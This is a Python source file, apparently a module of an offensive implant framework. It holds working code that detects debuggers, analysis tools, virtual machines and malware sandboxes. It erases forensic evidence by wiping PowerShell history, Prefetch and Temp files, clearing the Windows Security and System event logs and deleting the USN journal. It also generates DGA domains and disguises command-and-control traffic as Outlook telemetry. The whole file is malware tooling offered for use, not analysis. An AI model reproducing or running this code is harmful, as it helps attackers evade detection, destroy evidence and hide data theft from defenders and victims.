import os
import sys
import time
import random
import platform
import ctypes
import ctypes.wintypes
import hashlib
import string
import subprocess
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Union

# Windows Constants
PROCESS_QUERY_INFORMATION = 0x0400
THREAD_QUERY_INFORMATION = 0x0040
PROCESS_SET_INFORMATION = 0x0200
THREAD_HIDE_FROM_DEBUGGER = 0x11
PROCESS_DEBUG_PORT = 0x07
PROCESS_DEBUG_FLAGS = 0x1F
PROCESS_DEBUG_OBJECT_HANDLE = 0x1E


class OpSecModule:
    """
    Framework-level OPSEC hardening:
    - Minimize forensic artifacts
    - Anti-analysis detection
    - Anti-VM detection
    - Sandbox detection
    - IOC stripping
    """

    @staticmethod
    def detect_analysis_tools() -> Dict[str, Union[int, List[str]]]:
        """
        Detect: debuggers, system monitors, AV, EDR
        Check: registry keys, process names, window titles, loaded DLLs
        Return: threat level and detected tools
        """
        threat_level = 0
        detected_tools = []
        
        known_tools = [
            "x64dbg", "x32dbg", "ollydbg", "ida", "windbg", "ghidra",
            "procmon", "procexp", "wireshark", "tcpview", "autoruns",
            "sysmon", "frida", "cuckoo", "sandboxie", "vmtoolsd",
            "vboxservice", "wireshark", "fiddler", "burp", "zap",
            "processhacker", "pestudio", "immunitydebugger", "lordpe",
            "scylla", "petools", "regshot", "sniff_hit"
        ]
        
        known_dlls = [
            "sbiedll.dll", "dbghelp.dll", "api_log.dll", "dir_log.dll",
            "pstorec.dll", "vmcheck.dll", "w_hook.dll", "python27.dll"
        ]
        
        try:
            if platform.system() == "Windows":
                import psutil
                # 1. Process Check
                for proc in psutil.process_iter(['name']):
                    try:
                        proc_name = proc.info['name'].lower()
                        for tool in known_tools:
                            if tool in proc_name:
                                detected_tools.append(f"proc:{proc_name}")
                                threat_level += 15
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                
                # 2. Registry Check
                import winreg
                reg_paths = [
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                    (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                    (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services"),
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Analysis Tool"),
                ]
                
                for root, path in reg_paths:
                    try:
                        key = winreg.OpenKey(root, path)
                        i = 0
                        while True:
                            try:
                                subkey = winreg.EnumKey(key, i)
                                subkey_lower = subkey.lower()
                                for tool in known_tools:
                                    if tool in subkey_lower:
                                        detected_tools.append(f"reg:{subkey}")
                                        threat_level += 5
                                i += 1
                            except OSError:
                                break
                        winreg.CloseKey(key)
                    except Exception:
                        pass

                # 3. DLL Check
                kernel32 = ctypes.windll.kernel32
                for dll in known_dlls:
                    if kernel32.GetModuleHandleW(dll):
                        detected_tools.append(f"dll:{dll}")
                        threat_level += 20

                # 4. Window Title Check
                EnumWindows = ctypes.windll.user32.EnumWindows
                EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
                GetWindowText = ctypes.windll.user32.GetWindowTextW
                GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW

                def foreach_window(hwnd, lParam):
                    length = GetWindowTextLength(hwnd)
                    if length > 0:
                        buff = ctypes.create_unicode_buffer(length + 1)
                        GetWindowText(hwnd, buff, length + 1)
                        title = buff.value.lower()
                        for tool in known_tools:
                            if tool in title:
                                detected_tools.append(f"window:{title}")
                                # We can't easily modify threat_level here because of closure scope in Python 2/3 differences
                                # but we can append to detected_tools
                    return True

                EnumWindows(EnumWindowsProc(foreach_window), 0)
                threat_level += len([t for t in detected_tools if t.startswith("window:")]) * 10

        except Exception:
            pass
        
        return {"threat_level": min(threat_level, 100), "detected_tools": list(set(detected_tools))}

    @staticmethod
    def detect_virtualization() -> Tuple[bool, List[str]]:
        """
        Detect: Hyper-V, VMware, VirtualBox, KVM, Xen
        Check: CPUID, I/O ports, device names, MAC addresses, Disk/RAM size
        Return: is_vm boolean and detection reasons
        """
        is_vm = False
        reasons = []
        
        try:
            if platform.system() == "Windows":
                import winreg
                import psutil
                
                # 1. Hardware Specs (Sandboxes/VMs often have low specs)
                # Disk Size < 60GB
                disk_usage = psutil.disk_usage('C:\\')
                if disk_usage.total < (60 * 1024 * 1024 * 1024):
                    reasons.append(f"low_disk:{disk_usage.total // (1024**3)}GB")
                    is_vm = True
                
                # RAM < 4GB
                mem = psutil.virtual_memory()
                if mem.total < (4 * 1024 * 1024 * 1024):
                    reasons.append(f"low_ram:{mem.total // (1024**3)}GB")
                    is_vm = True

                # CPU Core Count < 2
                if psutil.cpu_count() < 2:
                    reasons.append(f"low_cpu_cores:{psutil.cpu_count()}")
                    is_vm = True

                # 2. Registry Keys
                vm_reg_keys = [
                    (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS", "SystemManufacturer"),
                    (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS", "SystemProductName"),
                    (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", "Identifier"),
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools", None),
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions", None),
                ]
                
                vm_strings = ["vmware", "virtualbox", "xen", "kvm", "qemu", "hyper-v", "vbox", "parallels"]
                
                for root, path, value in vm_reg_keys:
                    try:
                        key = winreg.OpenKey(root, path)
                        if value:
                            val, _ = winreg.QueryValueEx(key, value)
                            val_lower = str(val).lower()
                            for vm_str in vm_strings:
                                if vm_str in val_lower:
                                    reasons.append(f"registry_val:{val}")
                                    is_vm = True
                        else:
                            reasons.append(f"registry_key:{path}")
                            is_vm = True
                        winreg.CloseKey(key)
                    except Exception:
                        pass
                
                # 3. MAC Addresses
                vm_mac_prefixes = [
                    "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", # VMware
                    "08:00:27", # VirtualBox
                    "00:16:3E", # Xen
                    "00:15:5D", # Hyper-V
                    "54:52:00", # KVM/QEMU
                ]
                for iface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == psutil.AF_LINK:
                            mac = addr.address.replace("-", ":").upper()
                            for prefix in vm_mac_prefixes:
                                if mac.startswith(prefix.upper()):
                                    reasons.append(f"mac:{mac}")
                                    is_vm = True

                # 4. Device Drivers / Files
                vm_files = [
                    r"C:\windows\System32\Drivers\Vmmouse.sys",
                    r"C:\windows\System32\Drivers\vboxguest.sys",
                    r"C:\windows\System32\Drivers\vboxmouse.sys",
                    r"C:\windows\System32\Drivers\vboxvideo.sys",
                    r"C:\windows\System32\Drivers\vboxsf.sys",
                    r"C:\windows\System32\Drivers\vmbus.sys",
                ]
                for f in vm_files:
                    if os.path.exists(f):
                        reasons.append(f"file:{f}")
                        is_vm = True

        except Exception:
            pass
        
        return (is_vm, list(set(reasons)))

    @staticmethod
    def detect_sandbox() -> Tuple[bool, Optional[str]]:
        """
        Detect: Cuckoo, Any.run, JOE, Falcon Sandbox
        Check: file system, registry, network patterns, username, computer name
        Return: sandbox_type and is_sandbox
        """
        is_sandbox = False
        sandbox_type = None
        
        sandbox_indicators = {
            "cuckoo": [r"C:\cuckoo", r"C:\sample.exe"],
            "any_run": ["ANYRUN", "USER-PC"],
            "joe_sandbox": ["joesandbox"],
            "falcon": ["falcon sandbox"],
            "generic": ["sandbox", "malware", "test-pc", "analysis-pc"]
        }
        
        try:
            if platform.system() == "Windows":
                # 1. Username/Computername checks
                username = os.environ.get("USERNAME", "").lower()
                computername = os.environ.get("COMPUTERNAME", "").lower()
                
                for sbox, indicators in sandbox_indicators.items():
                    for ind in indicators:
                        if ind.lower() in username or ind.lower() in computername:
                            is_sandbox = True
                            sandbox_type = sbox
                            break
                    if is_sandbox: break

                # 2. Files and Registry (already partially covered in virtualization, but specific here)
                import winreg
                try:
                    # Check for Cuckoo pipes
                    for i in range(10):
                        if os.path.exists(f"\\\\.\\pipe\\cuckoo{i}"):
                            is_sandbox = True
                            sandbox_type = "cuckoo"
                except Exception: pass

                # 3. System Up-time
                import psutil
                uptime = time.time() - psutil.boot_time()
                if uptime < 600: # Less than 10 minutes
                    is_sandbox = True
                    sandbox_type = "low_uptime"

        except Exception:
            pass
        
        return (is_sandbox, sandbox_type)

    @staticmethod
    def anti_debugging() -> bool:
        """
        Implement: IsDebuggerPresent, CheckRemoteDebuggerPresent, NtQueryInformationProcess
        Use: hardware breakpoints, ThreadHideFromDebugger
        """
        is_debugged = False
        
        try:
            if platform.system() == "Windows":
                kernel32 = ctypes.windll.kernel32
                ntdll = ctypes.windll.ntdll
                
                # 1. Standard API
                if kernel32.IsDebuggerPresent():
                    return True
                
                remote_debugger = ctypes.wintypes.BOOL()
                kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(remote_debugger))
                if remote_debugger.value:
                    return True
                
                # 2. NtQueryInformationProcess
                # ProcessDebugPort
                debug_port = ctypes.c_uint32()
                ntdll.NtQueryInformationProcess(-1, PROCESS_DEBUG_PORT, ctypes.byref(debug_port), 4, None)
                if debug_port.value != 0:
                    return True
                
                # ProcessDebugFlags
                debug_flags = ctypes.c_uint32()
                ntdll.NtQueryInformationProcess(-1, PROCESS_DEBUG_FLAGS, ctypes.byref(debug_flags), 4, None)
                if debug_flags.value == 0: # 0 means debugged
                    return True

                # 3. Hardware Breakpoints
                class CONTEXT(ctypes.Structure):
                    _fields_ = [
                        ("ContextFlags", ctypes.wintypes.DWORD),
                        ("Dr0", ctypes.wintypes.DWORD64),
                        ("Dr1", ctypes.wintypes.DWORD64),
                        ("Dr2", ctypes.wintypes.DWORD64),
                        ("Dr3", ctypes.wintypes.DWORD64),
                        ("Dr6", ctypes.wintypes.DWORD64),
                        ("Dr7", ctypes.wintypes.DWORD64),
                        # ... other fields omitted for brevity as we only care about Dr0-Dr3
                    ]
                
                ctx = CONTEXT()
                ctx.ContextFlags = 0x10 # CONTEXT_DEBUG_REGISTERS
                if kernel32.GetThreadContext(kernel32.GetCurrentThread(), ctypes.byref(ctx)):
                    if ctx.Dr0 != 0 or ctx.Dr1 != 0 or ctx.Dr2 != 0 or ctx.Dr3 != 0:
                        return True

                # 4. Hide Thread From Debugger (Active Protection)
                ntdll.NtSetInformationThread(kernel32.GetCurrentThread(), THREAD_HIDE_FROM_DEBUGGER, None, 0)

        except Exception:
            pass
        
        return is_debugged

    @staticmethod
    def erase_traces() -> None:
        """
        Securely wipe: PowerShell history, Event logs, Prefetch, Temp, Recycle Bin, USN Journal
        """
        def secure_wipe(file_path: str, passes: int = 3):
            if not os.path.exists(file_path): return
            try:
                length = os.path.getsize(file_path)
                with open(file_path, "ba+", buffering=0) as f:
                    for _ in range(passes):
                        f.seek(0)
                        f.write(os.urandom(length))
                        f.flush()
                        os.fsync(f.fileno())
                os.remove(file_path)
            except Exception:
                try: os.remove(file_path) # Fallback to normal delete
                except Exception: pass

        try:
            if platform.system() == "Windows":
                # 1. PowerShell History
                ps_history_path = os.path.join(os.path.expanduser("~"), r"AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt")
                secure_wipe(ps_history_path)
                
                # 2. Prefetch
                prefetch_path = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "Prefetch")
                if os.path.exists(prefetch_path):
                    for f in os.listdir(prefetch_path):
                        secure_wipe(os.path.join(prefetch_path, f))
                
                # 3. Temp Files
                temp_path = os.environ.get("TEMP", os.environ.get("TMP", "C:\\Temp"))
                if os.path.exists(temp_path):
                    for f in os.listdir(temp_path):
                        file_path = os.path.join(temp_path, f)
                        if os.path.isfile(file_path):
                            secure_wipe(file_path)
                
                # 4. Event Logs (using wevtutil for thoroughness)
                logs = ["Application", "Security", "System", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational"]
                for log in logs:
                    try:
                        subprocess.run(["wevtutil", "cl", log], capture_output=True, check=False)
                    except Exception: pass

                # 5. USN Journal
                try:
                    subprocess.run(["fsutil", "usn", "deletejournal", "/d", "C:"], capture_output=True, check=False)
                except Exception: pass

        except Exception:
            pass

    @staticmethod
    def random_sleep(min_ms: int = 1000, max_ms: int = 10000) -> float:
        """
        Implement Poisson-distributed jitter for human-like timing
        """
        # Poisson distribution for more natural-looking traffic intervals
        mean = (min_ms + max_ms) / 2000.0
        sleep_seconds = random.expovariate(1.0 / mean)
        # Clamp to bounds
        sleep_seconds = max(min_ms / 1000.0, min(max_ms / 1000.0, sleep_seconds))
        time.sleep(sleep_seconds)
        return sleep_seconds


class C2SignatureEvasion:
    """
    APT-grade C2 signature evasion:
    - DGA (Domain Generation Algorithm)
    - Traffic randomization with jitter
    - Protocol obfuscation
    """
    def __init__(self, seed_phrase: str = "fitnah_apt_v2"):
        self.seed_phrase = seed_phrase

    def generate_dga_domain(self, date: Optional[datetime] = None) -> str:
        """
        Generate a domain based on date and seed phrase
        """
        if not date:
            date = datetime.now()
        
        date_str = date.strftime("%Y-%m-%d")
        seed = f"{self.seed_phrase}-{date_str}"
        hash_val = hashlib.sha256(seed.encode()).hexdigest()
        
        tlds = [".com", ".net", ".org", ".info", ".biz"]
        domain_len = 12 + (int(hash_val[0], 16) % 8)
        
        domain = ""
        for i in range(domain_len):
            char_idx = int(hash_val[i:i+2], 16) % 26
            domain += string.ascii_lowercase[char_idx]
            
        return domain + tlds[int(hash_val[-1], 16) % len(tlds)]

    def obfuscate_traffic(self, data: bytes, profile: str = "outlook") -> bytes:
        """
        Mimic legitimate service traffic
        """
        if profile == "outlook":
            # Mimic Outlook telemetry/sync traffic
            boundary = "".join(random.choices(string.ascii_letters + string.digits, k=16))
            header = (
                f"POST /api/v2.0/me/events HTTP/1.1\r\n"
                f"Host: outlook.office365.com\r\n"
                f"User-Agent: Outlook/16.0.12345 (Windows NT 10.0; Win64; x64)\r\n"
                f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
                f"Authorization: Bearer {hashlib.md5(os.urandom(16)).hexdigest()}\r\n"
                f"\r\n--{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"telemetry_data\"\r\n\r\n"
            ).encode()
            footer = f"\r\n--{boundary}--\r\n".encode()
            return header + data + footer
        
        # Default fallback: simple randomization
        padding = os.urandom(random.randint(16, 128))
        return hashlib.sha256(data[:10]).digest()[:8] + data + padding
